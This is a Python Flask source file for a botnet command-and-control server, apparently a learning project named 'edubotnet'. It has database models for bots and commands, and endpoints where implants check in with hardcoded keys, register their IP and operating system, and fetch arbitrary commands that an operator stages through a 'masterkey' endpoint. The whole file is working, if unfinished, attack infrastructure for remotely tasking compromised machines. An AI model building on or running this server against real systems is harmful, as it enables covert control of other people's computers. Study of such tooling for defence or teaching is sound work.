from flask import Flask, url_for, request, redirect, jsonify, render_template, session 
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime  

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///edubotnet.sqlite3'
db = SQLAlchemy(app)

FIRSTCONTACTKEY = 'firstcontact'
# TODO: Change the register key to change dynamically 
REGISTERKEY = 'registerkey'
MASTERKEY = 'masterkey'

"""
def returnjson(*arg):
    # If the number of parameters are even number
    if len(arg) % 2 != 0:
        return '[-] Wrong number of parameters!!!'

    else:
        return jsonify({})
"""

class Bot(db.Model):
    #__tablename__ = 'bots'
    id = db.Column('bot_id', db.Integer, primary_key=True)
    ip = db.Column(db.String(128))
    os = db.Column(db.String(128))
    # TODO: This might have to change later 
    cmds = db.relationship('Command', backref='bot', lazy=True)

    def __init__(self, ip, os):
        self.ip = ip 
        self.os = os
        self.cmds = []

    def get_id(self):
        return self.id

    def get_ip(self):
        return self.ip

    def get_os(self):
        return self.os

    def get_info(self):
        info = 'Bot[' + str(self.id) + '] IP: ' + self.ip + ' OS: ' + self.os
        return info

    def get_commands(self):
        result = '' 
        i = 0 
        for command in self.cmds:
            tmp = '[' + str(i) +'] ' + command.cmd + '\n'
            result += tmp 
            i+=1 

        return result 

    def jsonbot(self):
        # TODO: Create a function which returns a jsonify version of the bot information 
        pass 

class Command(db.Model):
    id = db.Column('cmd_id', db.Integer, primary_key=True)
    cmd = db.Column(db.String(128))
    result = db.Column(db.String(500))
    bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
    timestamp = db.Column(db.String(50)) 
    latest = db.Column(db.Boolean, default=False)

    def __init__(self, cmd, bot_id):
        self.cmd = cmd 
        self.bot_id = bot_id 
        self.timestamp = str(datetime.now())
        self.latest = False

    def set_latest_true(self):
        self.latest = True

    def set_latest_false(self):
        self.latest = False 

    def set_result(self, result):
        self.result = result 

    def get_info(self):
        info = '[Command Info] [' + self.timestamp + '] Bot_id: ' + str(self.bot_id) + ' Command Issued: ' + self.cmd
        result = self.result 

        return '\n'.join([info, result])

    #def pushCommand(self)


def init_db():
    db.drop_all()
    db.create_all()

@app.route('/')
def hello_world():
    return "Hello, world!"

@app.route('/firstcontact', methods=['POST'])
def firstcontact(): 
    """
    Description: Endpoint which retrieves first contact from the bot. 
    
    [POST] 
        - (str) firstcontactkey : firstcontact key to identify if the 
        contact is coming from the implant or not 
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form

    print("[DEBUG] firstcontact data = ", data)

    try:
        if data is None:
            return jsonify({'result': 'firstcontactkey is required'})
        elif data['firstcontactkey'] is None:
            return jsonify({'result': 'wrong'})
        elif data['firstcontactkey'] != FIRSTCONTACTKEY:
            return jsonify({'result': 'wrong firstcontactkey'})
        
        elif data['firstcontactkey'] == FIRSTCONTACTKEY:
            return jsonify({'result': 'success', 'registerkey': 'registerkey'})


    except Exception as e:
        return ''

@app.route('/register', methods=['POST'])
def register():
    """
    Description: Register a new bot to the server 

    [POST] 
        - (str) registerkey = Register key that is needed for the registration process. 
        The key could be obtained through the firstcontact. 

        - (str) ip = IP address of the bot 
        - (str) os = OS type (Nix/Windows) of the bot 
    """
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    registerkey = data['registerkey']
    bot_ip = data['ip']
    bot_os = data['os']

    print("[DEBUG] firstcontact data = ", data)

    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if registerkey is None:
            return jsonify({'error': 'regsiterkey is required'})
        if bot_ip is None:
            return jsonify({'error': 'ip is required'})
        if bot_os is None:
            return jsonify({'error': 'os is required'})

        print ("[DEBUG] registerkey = ", registerkey)
        print ("[DEBUG] ip = ", bot_ip)
        print ("[DEBUG] os = ", bot_os)
        
        try:
            """
            I was doing ip=ip, which is wrong, but flask was not
            giving any error messages. Lessons learned: if shit goes wrong, try using try/except for debugging 
            """
            query_bot = Bot.query.filter_by(ip=bot_ip).first()
        except Exception as e:
            print("[!]", e)

        if query_bot is not None:
            return jsonify({'error': 'Bot already registered'})

        else:
            print("[+] Added a new bot !")
            bot = Bot(bot_ip, bot_os)
            db.session.add(bot)
            db.session.commit()

            return jsonify({'result': 'Bot was added'})

    except Exception as e:
        return '' 

# TODO: Change this to POST, and add botkey for "authentication" <-- lmao
# TODO: Implement this API endpoint  
@app.route('/bot/<bot_ip>/task', methods=['POST'])
def bottask(bot_ip):
    #query_bot = Bot.query.filter_by(ip=bot_ip).first()
    #cmd = query_bot.cmds

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    registerkey = data['registerkey']

    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if registerkey is None:
            return jsonify({'error': 'regsiterkey is required'})

        # Get the bot corresponding with the bot_ip 
        query_bot = Bot.query.filter_by(ip=bot_ip).first()

        # Try getting commands, from the oldest staged command to the lastest staged command. 
        try:
            # FILO - Stack, first in, last out (last = most recent)
            command = query_bot.cmds[0]
        except Exception as e:
            return jsonify({'error': 'There are no commands available'})

        query_bot.cmds.remove(command)
        db.session.commit()

        return command.cmd


    except Exception as e:
        return str(e) 

# TODO: Should it be bot_id ? Or bot_ip? Which one makes logical sense?
@app.route('/bot/<bot_id>/push', methods=['POST'])
def botpush(bot_id):
    """
    TODO: This + cmd Model + Master key to reach this API endpoint 
    Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!

    [POST]
        - masterkey = Master's secret key 
        - cmd = Command to push to the bot 

    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    masterkey = data['masterkey']
    cmd = data['cmd']

    print("[DEBUG] masterkey = ", masterkey)
    print("[DEBUG] cmd = ", cmd)
    print("[DEBUG] bot_id = ", bot_id)


    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if masterkey is None:
            return jsonify({'error': 'masterkey is required'})
        if cmd is None:
            return jsonify({'error': 'cmd is required'})

        cmd = Command(cmd, bot_id)

        # Query and get the bot which has the bot_id, and then append the command to it 

        query_bot = Bot.query.filter_by(id=bot_id).first()

        try:
            query_bot.cmds.append(cmd)
            db.session.add(cmd)
            db.session.commit()

            return jsonify({'result': 'Command staged'})

        except Exception as e:
            print("[!!] ERROR for command!")
            print(e)
            return jsonify({'error': 'Error occurred'})

    except Exception as e:
        return '' 
    #command = Command()


# TODO: Change to POST, implement master authentication for OPSEC 
@app.route('/bot/list', methods=['GET'])
def botlist():
    botlist = Bot.query.all()

    for bot in botlist:
        print(bot.get_info())

    #print(type(botlist))

    return ''


init_db()

if __name__ == '__main__':
    app.run()